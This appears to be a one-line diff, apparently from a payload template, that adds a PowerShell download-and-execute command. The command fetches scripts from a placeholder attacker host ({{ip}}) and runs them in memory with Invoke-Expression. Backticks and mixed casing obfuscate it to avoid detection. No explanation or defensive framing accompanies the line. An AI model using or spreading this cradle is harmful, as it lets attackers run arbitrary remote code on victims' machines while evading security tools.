@@ -1,0 +1,1 @@
+i`e`x(iWr -UsEbaSIcparSING http://{{ip}}/a.ps1); i`e`x(iWr -UsEbaSIcparSING http://{{ip}}/{{filename}});
